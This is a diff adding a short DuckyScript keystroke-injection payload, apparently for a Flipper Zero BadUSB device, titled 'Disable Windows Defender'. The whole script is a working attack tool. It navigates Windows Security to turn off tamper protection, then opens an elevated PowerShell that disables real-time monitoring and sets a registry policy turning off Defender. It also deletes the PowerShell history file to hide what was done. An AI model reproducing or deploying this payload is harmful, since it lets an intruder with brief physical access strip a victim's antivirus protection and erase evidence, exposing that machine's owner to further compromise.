@@ -1,0 +1,35 @@
+REM Disable Windows Defender
+REM VERSION 1.0
+REM Author HackingMark
+REM FZ edit by FalsePhilospher
+REM Disables Tampering Protection and Kills Windows Defender on Win 22H2
+REM Tested on German Computers
+GUI s
+DELAY 500
+STRING Windows-Securitycenter
+DELAY 500
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+SPACE
+DELAY 500
+ALT y
+DELAY 500
+ALT F4
+DELAY 1500
+GUI x
+DELAY 100
+STRING a
+DELAY 500
+ALT y
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;
+ENTER
